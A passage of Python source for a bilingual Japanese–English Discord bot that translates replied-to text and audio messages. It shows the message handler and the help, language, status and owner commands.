    await bot.process_commands(message)

    if message.author.bot or bot.user not in message.mentions:
        return

    ctx = await bot.get_context(message)
    if ctx.valid:
        return

    if message.reference is None:
        await message.reply(
            f"👋 {message.author.mention}\n"
            f"**メッセージに返信して**タグしてください / "
            f"**Reply to a message** and tag me to translate it!\n"
            f"`!help` または `!helpja` でコマンド一覧を表示"
        )
        return

    try:
        original = await message.channel.fetch_message(message.reference.message_id)
    except Exception as exc:
        await message.reply(f"❌ メッセージを取得できませんでした / Could not fetch message: `{exc}`")
        return

    if original.author.bot:
        await message.reply("⚠️ ボットのメッセージは翻訳できません / Cannot translate bot messages.")
        return

    task = asyncio.create_task(handle_request(message, original))
    _background_tasks.add(task)
    task.add_done_callback(_background_tasks.discard)


@bot.command(name="help")
async def help_command(ctx: commands.Context):
    embed = _base_embed(title="Help — All Commands")
    embed.set_thumbnail(url=bot.user.display_avatar.url)

    embed.add_field(
        name="How to Translate",
        value=(
            "Reply to any message and mention the bot `@BotName`.\n"
            "Works with text messages and audio attachments.\n"
            "The bot auto-detects the source language."
        ),
        inline=False,
    )
    embed.add_field(
        name="Language Commands",
        value=(
            "`!lang [code]` — Set your personal target language\n"
            "`!langs`       — List all supported language codes\n"
            "`!resetlang`   — Clear your preference and restore default"
        ),
        inline=False,
    )
    embed.add_field(
        name="Info Commands",
        value=(
            "`!status`  — Show bot stats and your current settings\n"
            "`!owners`  — Who made this bot\n"
            "`!help`    — This English help board\n"
            "`!helpja`  — Japanese help board (日本語ヘルプ)"
        ),
        inline=False,
    )
    embed.add_field(
        name="Default Behaviour",
        value=(
            "Arabic   → translated to Japanese\n"
            "Japanese → translated to Arabic\n"
            "Any other language → translated to English\n"
            "Override with `!lang <code>`."
        ),
        inline=False,
    )
    embed.add_field(
        name="Audio Support",
        value=(
            f"Max size : {MAX_AUDIO_SIZE_MB} MB\n"
            f"Formats  : mp3  wav  ogg  m4a  webm  flac  opus  wma  aac"
        ),
        inline=False,
    )
    embed.add_field(
        name="Limits",
        value=(
            f"Per-user cooldown      : {USER_COOLDOWN_SECONDS}s after successful translation\n"
            f"Max concurrent/server  : {MAX_CONCURRENT_PER_GUILD}\n"
            f"Gemini fallback models : {len(MODEL_PRIORITY)}"
        ),
        inline=False,
    )
    await ctx.send(embed=embed)


@bot.command(name="helpja")
async def help_command_ja(ctx: commands.Context):
    embed = _base_embed(title="ヘルプ — 全コマンド一覧")
    embed.set_thumbnail(url=bot.user.display_avatar.url)

    embed.add_field(
        name="翻訳の使い方",
        value=(
            "翻訳したいメッセージに**返信**して、ボットを**メンション**してください。\n"
            "テキストメッセージと音声ファイルの両方に対応しています。\n"
            "送信元の言語は自動検出されます。"
        ),
        inline=False,
    )
    embed.add_field(
        name="言語コマンド",
        value=(
            "`!lang [コード]` — 個人の翻訳先言語を設定\n"
            "`!langs`         — 対応言語コード一覧を表示\n"
            "`!resetlang`     — 設定をリセットしてデフォルトに戻す"
        ),
        inline=False,
    )
    embed.add_field(
        name="情報コマンド",
        value=(
            "`!status`  — ボットの状態と個人設定を表示\n"
            "`!owners`  — 制作者情報を表示\n"
            "`!helpja`  — このヘルプを表示（日本語）\n"
            "`!help`    — 英語ヘルプを表示"
        ),
        inline=False,
    )
    embed.add_field(
        name="デフォルト動作",
        value=(
            "アラビア語 → 日本語に翻訳\n"
            "日本語 → アラビア語に翻訳\n"
            "その他の言語 → 英語に翻訳\n"
            "`!lang <コード>` で変更できます。"
        ),
        inline=False,
    )
    embed.add_field(
        name="対応言語コード一覧",
        value="\n".join(
            f"`{code}` — {name_ja}  /  {LANG_LABEL[code]}"
            for code, name_ja in sorted(LANG_LABEL_JA.items())
        ),
        inline=False,
    )
    embed.add_field(
        name="音声ファイルのサポート",
        value=(
            f"最大サイズ : {MAX_AUDIO_SIZE_MB} MB\n"
            f"対応形式   : mp3  wav  ogg  m4a  webm  flac  opus  wma  aac"
        ),
        inline=False,
    )
    embed.add_field(
        name="制限事項",
        value=(
            f"クールダウン（ユーザーごと）: 翻訳成功後 {USER_COOLDOWN_SECONDS}秒\n"
            f"同時翻訳数（サーバーごと）  : 最大 {MAX_CONCURRENT_PER_GUILD} 件\n"
            f"Gemini フォールバックモデル数: {len(MODEL_PRIORITY)} 個"
        ),
        inline=False,
    )
    await ctx.send(embed=embed)


@bot.command(name="langs")
async def list_languages(ctx: commands.Context):
    lines = [
        f"`{code}` — {LANG_LABEL[code]}  /  {LANG_LABEL_JA[code]}"
        for code in sorted(LANG_LABEL)
    ]
    embed = _base_embed(title="Supported Languages / 対応言語一覧")
    embed.description = "\n".join(lines)
    embed.add_field(
        name="Usage / 使い方",
        value="`!lang <code>` — e.g. `!lang en`  /  例: `!lang ja`",
        inline=False,
    )
    await ctx.send(embed=embed)


@bot.command(name="lang")
async def set_language(ctx: commands.Context, lang_code: Optional[str] = None):
    if not lang_code:
        current = get_user_lang(ctx.author.id)
        embed = _base_embed(title="Your Language Setting / 言語設定")
        if current:
            embed.description = (
                f"Current target / 現在の翻訳先:\n"
                f"**{LANG_LABEL.get(current, current)}**"
                f" / **{LANG_LABEL_JA.get(current, current)}**"
                f" (`{current}`)"
            )
        else:
            embed.description = (
                "No custom target set / カスタム設定なし\n"
                "Default: Arabic ↔ Japanese / デフォルト: アラビア語 ↔ 日本語\n\n"
                "Set with `!lang <code>` — see `!langs`"
            )
        await ctx.send(embed=embed)
        return

    lang_code = lang_code.lower().strip()
    if lang_code not in LANG_LABEL:
        codes = " ".join(f"`{k}`" for k in sorted(LANG_LABEL))
        embed = _base_embed(
            title="Unknown Language Code / 無効な言語コード",
            color=0xED4245,
        )
        embed.description = f"Available codes / 利用可能なコード:\n{codes}"
        await ctx.send(embed=embed)
        return

    set_user_lang(ctx.author.id, lang_code)
    embed = _base_embed(title="Language Updated / 言語を更新しました")
    embed.description = (
        f"{ctx.author.mention}\n"
        f"Target language / 翻訳先言語:\n"
        f"**{LANG_LABEL[lang_code]}** / **{LANG_LABEL_JA[lang_code]}**"
        f" (`{lang_code}`)\n\n"
        f"All your translations will now target this language.\n"
        f"以降の翻訳はこの言語に翻訳されます。"
    )
    await ctx.send(embed=embed)


@bot.command(name="resetlang")
async def reset_language(ctx: commands.Context):
    clear_user_lang(ctx.author.id)
    embed = _base_embed(title="Language Reset / 言語設定をリセットしました")
    embed.description = (
        f"{ctx.author.mention}\n"
        f"Preference cleared. Default restored: Arabic ↔ Japanese\n"
        f"設定をクリアしました。デフォルトに戻りました: アラビア語 ↔ 日本語"
    )
    await ctx.send(embed=embed)


@bot.command(name="status")
async def status_command(ctx: commands.Context):
    guild_id = ctx.guild.id if ctx.guild else 0
    active = _guild_active_requests.get(guild_id, 0)
    user_lang = get_user_lang(ctx.author.id)
    cooldown = is_user_on_cooldown(ctx.author.id)

    if user_lang:
        lang_display = (
            f"{LANG_LABEL.get(user_lang, user_lang)}"
            f" / {LANG_LABEL_JA.get(user_lang, user_lang)}"
            f" (`{user_lang}`)"
        )
    else:
        lang_display = "Default — Arabic ↔ Japanese / アラビア語 ↔ 日本語"

    embed = _base_embed(title="Bot Status / ボット状態")
    embed.set_thumbnail(url=bot.user.display_avatar.url)

    embed.add_field(
        name="Target Language / 翻訳先言語",
        value=lang_display,
        inline=False,
    )
    embed.add_field(
        name="Cooldown / クールダウン",
        value=f"{int(cooldown)}s remaining / 残り{int(cooldown)}秒" if cooldown else "Ready / 准备完了",
        inline=True,
    )
    embed.add_field(
        name="Active / 実行中",
        value=f"{active} / {MAX_CONCURRENT_PER_GUILD}",
        inline=True,
    )
    embed.add_field(
        name="Models / モデル数",
        value=str(len(MODEL_PRIORITY)),
        inline=True,
    )
    embed.add_field(
        name="Servers / サーバー数",
        value=str(len(bot.guilds)),
        inline=True,
    )
    embed.add_field(
        name="Languages / 対応言語数",
        value=str(len(LANG_LABEL)),
        inline=True,
    )
    embed.add_field(
        name="Version / バージョン",
        value=f"v{BOT_VERSION}",
        inline=True,
    )
    await ctx.send(embed=embed)


@bot.command(name="owners")
async def owners_command(ctx: commands.Context):
    embed = _base_embed(title="Bot Owners / 制作者")
    embed.set_thumbnail(url=bot.user.display_avatar.url)
    embed.description = f"**{BOT_NAME}** `v{BOT_VERSION}` was created by / 制作者:\n\u200b"

    for owner in OWNERS:
        embed.add_field(
            name=owner["name"],
            value=f"[GitHub Profile]({owner['github']})\n`{owner['github']}`",
            inline=True,
        )

    embed.add_field(
        name="\u200b",
        value="Found a bug or want to contribute?\nバグ報告や貢献はGitHubのIssue/PRからどうぞ！",
        inline=False,
    )
    await ctx.send(embed=embed)


if __name__ == "__main__":
    initialize_monitoring()
    bot.run(DISCORD_TOKEN)